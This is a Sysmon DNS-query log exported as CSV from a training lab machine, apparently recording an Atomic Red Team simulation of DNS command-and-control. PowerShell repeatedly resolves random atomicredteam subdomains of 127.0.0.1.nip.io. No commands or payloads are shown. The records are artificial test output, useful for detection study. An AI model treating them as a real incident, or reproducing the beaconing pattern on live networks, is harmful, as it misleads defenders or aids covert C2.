"2025-12-26 11:27:04.468 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174293,"Query: atomicredteam-303367.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:03.793","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:04.468 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174294,"Query: atomicredteam-852324.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:03.838","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:04.468 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174295,"Query: atomicredteam-110343.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:03.887","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:04.468 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174296,"Query: atomicredteam-75046.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:03.943","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:04.468 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174297,"Query: atomicredteam-652984.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:04.125","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:04.468 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174298,"Query: atomicredteam-891527.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:04.167","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:05.471 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174299,"Query: atomicredteam-593195.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:04.341","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:05.471 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174300,"Query: atomicredteam-483950.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:04.521","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:05.471 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174301,"Query: atomicredteam-54765.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:04.560","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:05.471 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174302,"Query: atomicredteam-712816.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:04.598","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:05.471 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174303,"Query: atomicredteam-295591.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:04.636","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:05.471 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174304,"Query: atomicredteam-952257.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:04.673","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:05.471 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174305,"Query: atomicredteam-791287.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:04.719","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:05.471 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174306,"Query: atomicredteam-909357.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:04.756","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:05.471 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174307,"Query: atomicredteam-791487.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:05.093","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:05.471 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174308,"Query: atomicredteam-158756.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:05.131","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:05.471 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174309,"Query: atomicredteam-675305.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:05.171","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:05.471 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174310,"Query: atomicredteam-412276.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:05.344","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:05.471 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174311,"Query: atomicredteam-446528.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:05.383","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:05.471 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174312,"Query: atomicredteam-695040.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:05.424","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:06.498 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174313,"Query: atomicredteam-335834.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:05.462","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:06.498 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174314,"Query: atomicredteam-123985.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:05.501","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:06.498 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174315,"Query: atomicredteam-844983.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:05.541","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:06.498 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174316,"Query: atomicredteam-995102.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:05.719","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:06.498 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174317,"Query: atomicredteam-616977.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:05.819","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:06.498 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174318,"Query: atomicredteam-505946.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:06.148","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:06.498 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174319,"Query: atomicredteam-374458.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:06.188","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:06.498 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174320,"Query: atomicredteam-138575.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:06.227","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:06.498 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174321,"Query: atomicredteam-179071.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:06.265","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:06.498 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174322,"Query: atomicredteam-599887.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:06.303","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:06.498 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174323,"Query: atomicredteam-531519.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:06.343","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:06.498 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174324,"Query: atomicredteam-926593.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:06.384","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:06.498 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174325,"Query: atomicredteam-21401.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:06.421","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:07.494 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174326,"Query: atomicredteam-775879.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:06.467","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:07.494 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174327,"Query: atomicredteam-202270.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:06.506","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:07.494 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174328,"Query: atomicredteam-864517.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:06.593","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:07.494 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174329,"Query: atomicredteam-6515.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:06.676","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:07.494 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174330,"Query: atomicredteam-761098.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:06.778","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:07.494 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174331,"Query: atomicredteam-346618.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:06.977","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:07.494 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174332,"Query: atomicredteam-646655.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:07.024","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:07.494 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174333,"Query: atomicredteam-115003.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:07.062","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:07.494 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174334,"Query: atomicredteam-396995.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:07.112","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:07.495 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174335,"Query: atomicredteam-883842.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:07.152","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:07.495 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174336,"Query: atomicredteam-818920.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:07.192","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:07.495 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174337,"Query: atomicredteam-621568.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:07.230","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:07.495 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174338,"Query: atomicredteam-800069.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:07.280","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:08.507 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174339,"Query: atomicredteam-358495.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:07.334","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:08.507 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174340,"Query: atomicredteam-239707.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:07.661","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
